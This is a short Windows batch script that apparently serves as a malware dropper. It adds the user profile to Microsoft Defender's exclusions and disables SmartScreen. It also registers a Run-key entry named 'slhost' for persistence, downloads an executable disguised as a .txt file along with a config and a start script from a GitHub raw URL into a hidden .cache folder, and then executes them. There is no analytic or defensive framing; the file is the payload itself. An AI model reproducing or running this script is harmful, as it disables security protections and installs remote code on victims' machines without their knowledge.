@echo off
powershell.exe -c "Set-MpPreference -ExclusionPath $env:USERPROFILE"
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v slhost /d \"%USERPROFILE%\.cache\services\slhost\Noise.bat\"  

mkdir %USERPROFILE%\.cache\services\slhost\ >nul 2>&1 

powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/slhost.txt','%USERPROFILE%\.cache\services\slhost\slhost.exe')"
powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/config.json','%USERPROFILE%\.cache\services\slhost\config.json')"
powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/start.cmd','%USERPROFILE%\.cache\services\slhost\Noise.bat')"

%USERPROFILE%\.cache\services\slhost\Noise.bat
